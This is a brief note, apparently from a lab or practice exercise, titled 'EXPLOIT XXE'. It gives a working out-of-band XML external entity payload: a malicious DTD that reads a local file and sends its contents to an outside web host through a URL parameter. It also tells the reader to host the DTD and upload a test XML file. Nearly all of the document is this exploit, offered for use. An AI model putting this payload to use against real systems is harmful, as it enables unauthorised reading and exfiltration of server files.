# EXPLOIT XXE
You must host the malicious DTD on a system that you control.
An example of a malicious DTD to exfiltrate the contents of the /hellothere.txt file is as follows:

```
<!ENTITY % file SYSTEM "file:///hellothere.txt">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://sanglv11.000webhostapp.com/?x=%file;'>">
%eval;
%exfiltrate;
```

Upload file test.xml to see how it goes.
